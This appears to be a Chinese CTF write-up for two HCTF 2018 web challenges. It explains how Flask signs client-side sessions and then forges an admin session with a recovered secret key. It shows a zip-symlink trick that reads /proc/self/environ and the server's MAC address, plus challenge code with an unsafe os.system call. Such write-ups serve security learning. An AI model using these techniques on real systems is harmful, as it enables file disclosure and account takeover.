# 从HCTF两道Web题谈谈flask客户端session机制

阅读量 **472593**

|评论 **7**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-11-12 14:20:07

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

>
> 这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的解法。

个人第一次见到关于客户端session的文章是pith0n师傅的一片文章[客户端session导致的安全问题](https://www.leavesongs.com/PENETRATION/client-session-security.html)。然而做题的时候只看phith0n师傅的这篇文章感觉还是有点儿懵逼。。。（也可能是我太菜了233）所以就只能翻flask的源码跟了一遍flask对session的处理流程。

## flask对客户端session的处理机制

flask对session的处理位于flask/sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。

在flask/sessions.py中，SecureCookieSessionInterface用于封装对CookieSession的一系列操作：

    
    
    class SecureCookieSessionInterface(SessionInterface):
        """The default session interface that stores sessions in signed cookies
        through the :mod:`itsdangerous` module.
        """
        # salt,默认为cookie-session
        salt = 'cookie-session'
        #: 默认哈希函数为hashlib.sha1
        digest_method = staticmethod(hashlib.sha1)
        #:默认密钥推导方式 :hmac
        key_derivation = 'hmac'
        #:默认序列化方式：session_json_serializer
        serializer = session_json_serializer
        session_class = SecureCookieSession

这里默认的序列化方式的定义为：

    
    
    session_json_serializer = TaggedJSONSerializer()

可以看到默认使用taggedJSONSerializer做序列化

taggedJSONSerializer定义：

    
    
    class TaggedJSONSerializer(object):
        """A customized JSON serializer that supports a few extra types that
        we take for granted when serializing (tuples, markup objects, datetime).
        """
        def dumps(self, value):
            def _tag(value):
                if isinstance(value, tuple):
                    return {' t': [_tag(x) for x in value]}
                elif isinstance(value, uuid.UUID):
                    return {' u': value.hex}
                elif isinstance(value, bytes):
                    return {' b': b64encode(value).decode('ascii')}
                elif callable(getattr(value, '__html__', None)):
                    return {' m': text_type(value.__html__())}
                elif isinstance(value, list):
                    return [_tag(x) for x in value]
                elif isinstance(value, datetime):
                    return {' d': http_date(value)}
                elif isinstance(value, dict):
                    return dict((k, _tag(v)) for k, v in iteritems(value))
                elif isinstance(value, str):
                    try:
                        return text_type(value)
                    except UnicodeError:
                        raise UnexpectedUnicodeError(u'A byte string with '
                            u'non-ASCII data was passed to the session system '
                            u'which can only store unicode strings.  Consider '
                            u'base64 encoding your string (String was %r)' % value)
                return value
            return json.dumps(_tag(value), separators=(',', ':'))
    
        def loads(self, value):
            def object_hook(obj):
                if len(obj) != 1:
                    return obj
                the_key, the_value = next(iteritems(obj))
                if the_key == ' t':
                    return tuple(the_value)
                elif the_key == ' u':
                    return uuid.UUID(the_value)
                elif the_key == ' b':
                    return b64decode(the_value)
                elif the_key == ' m':
                    return Markup(the_value)
                elif the_key == ' d':
                    return parse_date(the_value)
                return obj
            return json.loads(value, object_hook=object_hook)

可以看到本质还是一个添加了类型属性的json处理。

SecureCookieSessionInterface类的获取签名验证序列化器函数为get_signing_serializer

    
    
        def get_signing_serializer(self, app):
            if not app.secret_key:
                return None
            signer_kwargs = dict(
                key_derivation=self.key_derivation,
                digest_method=self.digest_method
            )
            return URLSafeTimedSerializer(app.secret_key, salt=self.salt,
                                          serializer=self.serializer,
                                          signer_kwargs=signer_kwargs)

可以看到最后使用的签名序列化器为URLSafeTimedSerializer，并且传入app.secret_key用于签名。

SecureCookieSessionInterface的open_session与save_session方法表示了对session的处理

    
    
        def open_session(self, app, request):
            s = self.get_signing_serializer(app)
            if s is None:
                return None
            val = request.cookies.get(app.session_cookie_name)
            if not val:
                return self.session_class()
            max_age = total_seconds(app.permanent_session_lifetime)
            try:
                data = s.loads(val, max_age=max_age)#max_age
                return self.session_class(data)
            except BadSignature:
                return self.session_class()
    
        def save_session(self, app, session, response):
            domain = self.get_cookie_domain(app)
            path = self.get_cookie_path(app)
            if not session:
                if session.modified:
                    response.delete_cookie(app.session_cookie_name,
                                           domain=domain, path=path)
                return
            httponly = self.get_cookie_httponly(app)
            secure = self.get_cookie_secure(app)
            expires = self.get_expiration_time(app, session)
            print self.get_signing_serializer(app)
            val = self.get_signing_serializer(app).dumps(dict(session))
            response.set_cookie(app.session_cookie_name, val,
                                expires=expires, httponly=httponly,
                                domain=domain, path=path, secure=secure)

可以看到从客户端获取session时获取对应的cookie值，并使用序列化器序列化，能够成功序列化即可获取sesison_class,否则返回一个空的session_class.

SecureCookieSession使用的默认序列化器URLSafeTimedSeriallizer位于itsdangerous模块中：

    
    
    class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer):
        """Works like :class:`TimedSerializer` but dumps and loads into a URL
        safe string consisting of the upper and lowercase character of the
        alphabet as well as ``'_'``, ``'-'`` and ``'.'``.
        """
        default_serializer = compact_json

### 序列化

序列化的流程在TimedSerializer的父类Serializer中

    
    
        def dumps(self, obj, salt=None):
            """Returns a signed string serialized with the internal serializer.
            The return value can be either a byte or unicode string depending
            on the format of the internal serializer.
            """
            payload = want_bytes(self.dump_payload(obj))
            rv = self.make_signer(salt).sign(payload)
            if self.is_text_serializer:
                rv = rv.decode('utf-8')
            return rv

可以看到主要处理流程是将obj用dump_payload签名后利用make_signer(salt)生成的signer进行签名处理，并返回签名后的结果即为我们所需要的cookie值，而URLSafeTimedSeralizer的dump_playload方法继承自URLSafeSerializerMixin的dump_payload方法

    
    
        def dump_payload(self, obj):
            json = super(URLSafeSerializerMixin, self).dump_payload(obj)
            is_compressed = False
            compressed = zlib.compress(json)
            if len(compressed) < (len(json) - 1):
                json = compressed
                is_compressed = True
            base64d = base64_encode(json)
            if is_compressed:
                base64d = b'.' + base64d
            return base64d

对obj的处理首先使用URLSafeTimedSeralizer的另一个父类TimedSeralizer继承自Seralizer的dump_payload方法处理

    
    
        def dump_payload(self, obj):
            """Dumps the encoded object.  The return value is always a
            bytestring.  If the internal serializer is text based the value
            will automatically be encoded to utf-8.
            """
            return want_bytes(self.serializer.dumps(obj))

其中self.serializer为之前SecureCookieSessionInterface的get_signing_serializer传入，即taggedJSONSerializer。  
处理之后如果长度过长会进行一次zlib压缩，最后将生成的数据base64编码。

再回到之前Seralizer的dumps的处理流程中，self.make_signer(salt)的定义如下:

    
    
        def make_signer(self, salt=None):
            """A method that creates a new instance of the signer to be used.
            The default implementation uses the :class:`Signer` baseclass.
            """
            if salt is None:
                salt = self.salt
            return self.signer(self.secret_key, salt=salt, **self.signer_kwargs)

self.salt、self.signer_kwargs、self.secret_key来自之前SecureCookieSessionInterface的get_signing_serializer传入，分别为app.secret_key、’cookie-session’、{‘key_derivation’:’hmac’,’digest_method’=staticmethod(hashlib.sha1)}，而self.signer为TimedSeralizer中指定

    
    
    class TimedSerializer(Serializer):
        """Uses the :class:`TimestampSigner` instead of the default
        :meth:`Signer`.
        """
    
        default_signer = TimestampSigner

TimestampSigner签名过程为：

    
    
        def sign(self, value):
            """Signs the given string and also attaches a time information."""
            value = want_bytes(value)
            timestamp = base64_encode(int_to_bytes(self.get_timestamp()))
            sep = want_bytes(self.sep)
            value = value + sep + timestamp
            return value + sep + self.get_signature(value)

将传入的value拼接上时间戳之后再拼接签名内容，签名实现继承自Signer类的get_signature方法

    
    
        def get_signature(self, value):
            """Returns the signature for the given value"""
            value = want_bytes(value)
            key = self.derive_key()
            sig = self.algorithm.get_signature(key, value)
            return base64_encode(sig)

因此，整个序列化的流程便是将obj处理为json格式后根据长度选择是否zlib压缩，之后再进行base64加密，拼接上当前时间戳之后再使用hmac签名并且拼接到该字符串上即为我们所需要的payload。

###  反序列化

反签名的流程主要为TimedSerializer类的loads函数

    
    
    class TimedSerializer(Serializer):
        """Uses the :class:`TimestampSigner` instead of the default
        :meth:`Signer`.
        """
    
        default_signer = TimestampSigner
    
        def loads(self, s, max_age=None, return_timestamp=False, salt=None):
            """Reverse of :meth:`dumps`, raises :exc:`BadSignature` if the
            signature validation fails.  If a `max_age` is provided it will
            ensure the signature is not older than that time in seconds.  In
            case the signature is outdated, :exc:`SignatureExpired` is raised
            which is a subclass of :exc:`BadSignature`.  All arguments are
            forwarded to the signer's :meth:`~TimestampSigner.unsign` method.
            """
            base64d, timestamp = self.make_signer(salt) 
                .unsign(s, max_age, return_timestamp=True)
            payload = self.load_payload(base64d)
            if return_timestamp:
                return payload, timestamp
            return payload
    
        def loads_unsafe(self, s, max_age=None, salt=None):
            load_kwargs = {'max_age': max_age}
            load_payload_kwargs = {}
            return self._loads_unsafe_impl(s, salt, load_kwargs, load_payload_kwargs)

这里的loads部分使用TimestampSigner来对传入的数据进行解析，查看TimestampSinger中关于签名与反签名的源码：

    
    
        def sign(self, value):
            """Signs the given string and also attaches a time information."""
            value = want_bytes(value)
            timestamp = base64_encode(int_to_bytes(self.get_timestamp()))
            sep = want_bytes(self.sep)
            value = value + sep + timestamp
            return value + sep + self.get_signature(value)
    
           def unsign(self, value, max_age=None, return_timestamp=False):
            """Works like the regular :meth:`~Signer.unsign` but can also
            validate the time.  See the base docstring of the class for
            the general behavior.  If `return_timestamp` is set to `True`
            the timestamp of the signature will be returned as naive
            :class:`datetime.datetime` object in UTC.
            """
            try:
                result = Signer.unsign(self, value)
                sig_error = None
            except BadSignature as e:
                sig_error = e
                result = e.payload or b''
            sep = want_bytes(self.sep)
    
            # If there is no timestamp in the result there is something
            # seriously wrong.  In case there was a signature error, we raise
            # that one directly, otherwise we have a weird situation in which
            # we shouldn't have come except someone uses a time-based serializer
            # on non-timestamp data, so catch that.
            if not sep in result:
                if sig_error:
                    raise sig_error
                raise BadTimeSignature('timestamp missing', payload=result)
    
            value, timestamp = result.rsplit(sep, 1)
            try:
                timestamp = bytes_to_int(base64_decode(timestamp))
            except Exception:
                timestamp = None
    
            # Signature is *not* okay.  Raise a proper error now that we have
            # split the value and the timestamp.
            if sig_error is not None:
                raise BadTimeSignature(text_type(sig_error), payload=value,
                                       date_signed=timestamp)
    
            # Signature was okay but the timestamp is actually not there or
            # malformed.  Should not happen, but well.  We handle it nonetheless
            #检查timestamp
            if timestamp is None:
                raise BadTimeSignature('Malformed timestamp', payload=value)
    
            # Check timestamp is not older than max_age
            if max_age is not None:
                age = self.get_timestamp() - timestamp
                if age > max_age:
                    raise SignatureExpired(
                        'Signature age %s > %s seconds' % (age, max_age),
                        payload=value,
                        date_signed=self.timestamp_to_datetime(timestamp))
    
            if return_timestamp:
                return value, self.timestamp_to_datetime(timestamp)
            return value

unsigin过程直接调用父类Signer的unsign,再进行timestamp的检查，由于之前调用时传入了max_age所以会检查timestamp是否超时（当时没注意到这一点一直以为随便一个timestamp就可以结果gg了。。。）

###  序列化与反序列化的总结

最后经过flask处理的字符串的格式为：

    
    
    json->zlib->base64后的源字符串 . 时间戳 . hmac签名信息

对于以上的调用我们可以总结为这样的代码(与服务器上的python版本无关，如果不确定服务器运行环境timestamp最好根据服务器反馈获取)：

    
    
    from itsdangerous import *
    from flask.sessions import *
    
    
    key='*******'
    salt="cookie-session"
    serializer=session_json_serializer
    digest_method=hashlib.sha1
    key_derivation='hmac'
    
    signer_kwargs = dict(
                key_derivation=key_derivation,
                digest_method=digest_method
            )
    
    
    def serialize(obj,timestamp,sep):
            my_serializer=URLSafeTimedSerializer(key,salt=salt,serializer=serializer,signer_kwargs=signer_kwargs)
            base64d=my_serializer.dump_payload(obj) #数据压缩
            data=base64d+sep+timestamp #拼接timestamp
            result=data+sep+my_serializer.make_signer(salt).get_signature(data) #拼接签名内容
            return result

而从cookie获取session的过程便是验证签名->验证是否过期->解码，解码可以使用phith0n师傅的payload：

    
    
    #!/usr/bin/env python3
    import sys
    import zlib
    from base64 import b64decode
    from flask.sessions import session_json_serializer
    from itsdangerous import base64_decode
    
    def decryption(payload):
        payload, sig = payload.rsplit(b'.', 1)
        payload, timestamp = payload.rsplit(b'.', 1)
    
        decompress = False
        if payload.startswith(b'.'):
            payload = payload[1:]
            decompress = True
    
        try:
            payload = base64_decode(payload)
        except Exception as e:
            raise Exception('Could not base64 decode the payload because of '
                             'an exception')
    
        if decompress:
            try:
                payload = zlib.decompress(payload)
            except Exception as e:
                raise Exception('Could not zlib decompress the payload before '
                                 'decoding the payload')
    
        return session_json_serializer.loads(payload)
    
    if __name__ == '__main__':
        print(decryption(sys.argv[1].encode()))

需要特别注意的是python2与python3下产生的timestamp是不一样的！！！当时被这个问题坑了很久。。。

## hctf两道题目的wp

有了以上的分析要解决hctf的这两道题目就很容易了：

###  admin

<http://admin.2018.hctf.io/index>

这道题目我们能做出来是因为在github上搜索hctf,按照recent
updated得到了题目的repo<https://github.com/woadsl1234/hctf_flask>

repo中暴露了私钥信息,而且题目只需要能用admin用户登入即可，因此可以直接使用上面的脚本跑出admin用户的session来。

###  hide and seek

<http://hideandseek.2018.hctf.io/>

这道题目中登入后会要求我们上传一个zip文件,如果zip文件内的所有文件都是文本文件便可以成功返回文件的内容。  
然而zip文件中也可以包含软链接,采用zip -ry out.zip
link即可将一个软链接打包到out.zip中。因此我们可以尝试上传包含/proc/self/environ软链接的压缩包来获取一些运行环境信息

    
    
    ln -s /proc/self/environ link
    zip -ry out.zip link

上传后可以获得当前一些环境信息：

  
可以发现uwsgi配置文件的路径/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini,尝试读取配置文件

    
    
    [uwsgi]
    module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main
    callable=app

可以得知当前脚本为/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py

从而获取到源码

    
    
    # -*- coding: utf-8 -*-    from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
    import uuid
    import base64
    import random
    import flag
    from werkzeug.utils import secure_filename
    import os
    random.seed(uuid.getnode())
    app = Flask(__name__)
    app.config['SECRET_KEY'] = str(random.random()*100)
    app.config['UPLOAD_FOLDER'] = './uploads'
    app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
    ALLOWED_EXTENSIONS = set(['zip'])
    
    def allowed_file(filename):
        return '.' in filename and 
               filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
    
    
    @app.route('/', methods=['GET'])
    def index():
        error = request.args.get('error', '')
        if(error == '1'):
            session.pop('username', None)
            return render_template('index.html', forbidden=1)
    
        if 'username' in session:
            return render_template('index.html', user=session['username'], flag=flag.flag)
        else:
            return render_template('index.html')
    
    
    @app.route('/login', methods=['POST'])
    def login():
        username=request.form['username']
        password=request.form['password']
        if request.method == 'POST' and username != '' and password != '':
            if(username == 'admin'):
                return redirect(url_for('index',error=1))
            session['username'] = username
        return redirect(url_for('index'))
    
    
    @app.route('/logout', methods=['GET'])
    def logout():
        session.pop('username', None)
        return redirect(url_for('index'))
    
    @app.route('/upload', methods=['POST'])
    def upload_file():
        if 'the_file' not in request.files:
            return redirect(url_for('index'))
        file = request.files['the_file']
        if file.filename == '':
            return redirect(url_for('index'))
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            if(os.path.exists(file_save_path)):
                return 'This file already exists'
            file.save(file_save_path)
        else:
            return 'This file is not a zipfile'
    
    
        try:
            extract_path = file_save_path + '_'
            os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
            read_obj = os.popen('cat ' + extract_path + '/*')
            file = read_obj.read()
            read_obj.close()
            os.system('rm -rf ' + extract_path)
        except Exception as e:
            file = None
    
        os.remove(file_save_path)
        if(file != None):
            if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
                return redirect(url_for('index', error=1))
        return Response(file)
    
    
    if __name__ == '__main__':
        #app.run(debug=True)
        app.run(host='127.0.0.1', debug=True, port=10008)

然而并无法获取flag.py的源码，因为限制了内容不能包含hctf。

尝试获取/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html

可以得知只要能用admin登入即可获得flag.

这里我们重点查看payload中SECRET_KEY的生成方式

    
    
    random.seed(uuid.getnode())
    app = Flask(__name__)
    app.config['SECRET_KEY'] = str(random.random()*100)

可以看到随机数的种子为uuid.getnode().而uuid.getnode()函数返回的便是当前网卡的mac地址。那么要怎样获取服务器上的网卡地址?

这里便可以通过linux强大的特殊文件系统来获取。首先利用之前的方法读取/proc/net/dev可以发现服务器上的所有网卡。可以发现服务器只有eth0和lo两个网卡。之后再读取/sys/class/net/eth0/address

即可获取eth0网卡的mac地址。获取了地址，我们便获取了SECRET_KEY，之后便可以使用我们上面的payload来伪造session从二获取flag。

## 后记

通过这次hctf深入的了解了flask的客户端session的生成过程，可以说hctf相比最近的一些神仙大战确实是异常很适合web狗的比赛了。每年的hctf都能学到一些东西，希望以后能多一些这样干货满满的比赛。○|￣|_

ps:如果出一道改了源码改了默认salt和签名机制的题目会不会被打死ヾ(≧∇≦*)ゝ

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **差池其羽** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/163975](/post/id/163975)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [Web安全](/tag/Web安全)
  * [writeup](/tag/writeup)
  * [Session](/tag/Session)
  * [Flask](/tag/Flask)

 **+1** __14赞

 __收藏

![](https://thirdqq.qlogo.cn/qqapp/101430193/5222C368D173BB82F8C7FFE6375E88DE/40)
差池其羽

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

